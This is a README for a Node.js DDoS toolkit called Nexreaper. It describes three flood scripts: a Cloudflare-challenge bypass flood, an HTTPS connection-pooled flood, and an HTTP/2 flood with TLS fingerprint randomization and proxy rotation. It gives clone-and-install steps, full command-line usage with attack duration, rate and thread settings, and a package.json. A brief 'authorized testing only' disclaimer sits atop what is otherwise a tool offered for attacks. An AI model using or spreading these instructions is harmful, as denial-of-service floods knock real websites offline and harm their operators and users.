```markdown
# 🌩️ Nexreaper Node.js DDoS Toolkit

**Mene – Nexreaper delivers.**

A collection of high‑performance Node.js DDoS tools with proxy support, Cloudflare bypass, and real‑time progress bars. Designed for authorized security testing and educational research.

> ⚠️ **Disclaimer:** This tool is for **authorized penetration testing and educational purposes only**. Unauthorized use against third‑party systems is illegal. The developers assume no responsibility for misuse.

---

## 📦 Included Scripts

| File | Description |
|------|-------------|
| `nexreaper-cf.js` | **Cloudflare bypass** – uses `cloudscraper` to solve JavaScript challenges and flood HTTPS targets. |
| `nexreaper-https.js` | **HTTPS (HTTP/1.1) flood** – connection‑pooled requests with proxy rotation. |
| `nexreaper-http2.js` | **HTTP/2 flood** – high‑performance multiplexing with TLS fingerprint randomization and proxy CONNECT. |

---

## 🛠️ Prerequisites

- [Node.js](https://nodejs.org/) >= 16.x
- npm (comes with Node.js)

---

## 📦 Installation

```bash
git clone https://github.com/Nexreaper/NEX-DDOS.git
cd NEX-DDOS
npm install
```

This installs:
- `user-agents` – for random browser user‑agents
- `https-proxy-agent` – for proxy support (HTTPS/HTTP)
- `cloudscraper` – for Cloudflare bypass
- `http2` – built‑in, no extra package

---

## 📄 Proxy File Format

All scripts accept a proxy file with one proxy per line in `IP:PORT` format:

```
192.168.1.1:8080
203.0.113.5:3128
10.0.0.1:80
```

Proxies are rotated round‑robin automatically.  
Use the `--direct` flag to bypass proxies and connect directly.

---

## 🚀 Usage

### 1. Cloudflare Bypass Flood (`nexreaper-cf.js`)
Automatically solves Cloudflare challenges using `cloudscraper`.

```bash
node nexreaper-cf.js <target> <time> <rate> <threads> <proxy.txt> [--direct]
```

**Example:**
```bash
node nexreaper-cf.js https://example.com 60 100 4 proxies.txt --direct
```

- `target`   – full URL (must be HTTPS)
- `time`     – attack duration (seconds)
- `rate`     – requests per second per worker
- `threads`  – number of worker processes
- `proxy.txt`– proxy list file (optional with `--direct`)
- `--direct` – bypass proxies (optional)

---

### 2. HTTPS (HTTP/1.1) Flood (`nexreaper-https.js`)
Uses connection pooling and works on both HTTP and HTTPS.

```bash
node nexreaper-https.js <target> <time> <rate> <threads> <proxy.txt> [--direct]
```

**Example:**
```bash
node nexreaper-https.js https://example.com 60 200 4 proxies.txt
```

---

### 3. HTTP/2 Flood (`nexreaper-http2.js`)
High‑performance multiplexing with TLS cipher rotation and proxy CONNECT.

```bash
node nexreaper-http2.js <target> <time> <rate> <threads> <proxy.txt>
```

> **Note:** This script does **not** support `--direct` because it relies on proxy CONNECT to establish the TLS tunnel. Use `--direct` with the HTTPS or CF scripts for direct connections.

**Example:**
```bash
node nexreaper-http2.js https://example.com 60 500 8 proxies.txt
```

---

## 📊 Live Progress Bar

All scripts display a real‑time progress bar:

```
[21:05:33] [#######---------------------] 23.5% | Flooding | Req: 12,345 | 205.8 req/s
```

- Percentage of time elapsed
- Current status (`Connecting...`, `Bypassing...`, or `Flooding`)
- Total requests sent
- Requests per second

---

## 🛡️ Cloudflare Bypass Notes

- `nexreaper-cf.js` uses `cloudscraper` to solve JavaScript challenges.
- For heavily protected sites (e.g., Turnstile), you may need the Python toolkit (`undetected-chromedriver`).
- The HTTPS and HTTP/2 tools **do not** bypass Cloudflare – use `nexreaper-cf.js` for those targets.

---

## ⚙️ Dependencies (package.json)

```json
{
  "name": "nexreaper-js-ddos",
  "version": "4.0.0",
  "description": "Nexreaper Node.js DDoS tools – Cloudflare bypass, HTTPS, HTTP/2",
  "main": "nexreaper-cf.js",
  "scripts": {
    "cf": "node nexreaper-cf.js",
    "https": "node nexreaper-https.js",
    "http2": "node nexreaper-http2.js"
  },
  "dependencies": {
    "user-agents": "^1.1.0",
    "https-proxy-agent": "^7.0.2",
    "cloudscraper": "^4.6.0"
  },
  "author": "Ahmad Bilal Qureshi (Nexreaper)",
  "license": "MIT"
}
```

Install dependencies:
```bash
npm install
```

---

## 👑 Credits

- **Author:** Ahmad Bilal Qureshi (Nexreaper)
  - TikTok: [@nexreaper_69](https://tiktok.com/@nexreaper_69)
  - Instagram: [@dex7er_0](https://instagram.com/dex7er_0)
- **Contributor:** Wolf Intelligence

---

## ⚖️ License

MIT – see [LICENSE](LICENSE).

---
